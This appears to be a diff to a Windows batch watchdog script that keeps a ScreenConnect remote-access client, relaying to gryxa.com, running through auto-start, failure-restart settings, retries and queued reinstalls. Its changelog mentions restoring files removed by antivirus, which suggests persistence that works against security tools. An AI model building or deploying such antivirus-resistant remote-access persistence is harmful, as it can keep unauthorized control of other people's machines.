@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M52
+rem  OWN_MON  BUILD 20260804M53
+rem  M53: STOPPED+relay ImagePath → sc start only (never heal/reinstall); longer start wait; heal only on 1060.
 rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
 rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
 rem  M50: hash-mismatch → BUILD fallback (unstick CDN-stale main).
@@ -51,7 +52,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M52"
+set "MONVER=M53"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -509,12 +510,30 @@ if exist "%WD%\gryxa_msi.lock" (
 if "!GRYXA_OK!"=="0" (
   echo gryxa_mon_start_only>>"%LOG%"
   sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+  sc failure "ScreenConnect Client (%GRYXA_FP%)" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  timeout /t 12 /nobreak >nul
   sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
   timeout /t 5 /nobreak >nul
   sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
   if not errorlevel 1 (
     reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
     if not errorlevel 1 set "GRYXA_OK=1"
+  )
+  rem M53: service exists STOPPED with relay → start-only, do NOT reinstall
+  if "!GRYXA_OK!"=="0" (
+    sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+    if not errorlevel 1 (
+      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+      if not errorlevel 1 (
+        echo gryxa_stopped_relay_start_retry>>"%LOG%"
+        sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+        timeout /t 10 /nobreak >nul
+        sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+        if not errorlevel 1 set "GRYXA_OK=1"
+        if "!GRYXA_OK!"=="0" echo gryxa_stopped_relay_still_down_no_heal>>"%LOG%"
+      )
+    )
   )
   if "!GRYXA_OK!"=="0" (
     for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
@@ -534,16 +553,21 @@ if "!GRYXA_OK!"=="0" (
   )
 )
 
-rem stuck: install dir present but service 1060, OR still down → queue heal (rate-limited)
+rem heal ONLY when service missing (1060). Never reinstall over STOPPED+relay.
 set "NEED_HEAL=0"
 if "!GRYXA_OK!"=="0" (
-  if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" set "NEED_HEAL=1"
-  if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" set "NEED_HEAL=1"
-  if "!NEED_HEAL!"=="1" (
-    echo gryxa_stuck_or_dir_heal>>"%LOG%"
-  ) else (
+  sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  if errorlevel 1 (
     set "NEED_HEAL=1"
-    echo gryxa_absent_queue_heal>>"%LOG%"
+    if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" (
+      echo gryxa_1060_with_dir_heal>>"%LOG%"
+    ) else if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" (
+      echo gryxa_1060_with_dir_heal>>"%LOG%"
+    ) else (
+      echo gryxa_absent_queue_heal>>"%LOG%"
+    )
+  ) else (
+    echo gryxa_svc_exists_skip_heal>>"%LOG%"
   )
 )
 if "!NEED_HEAL!"=="1" call :QueueGryxaHeal HEAL
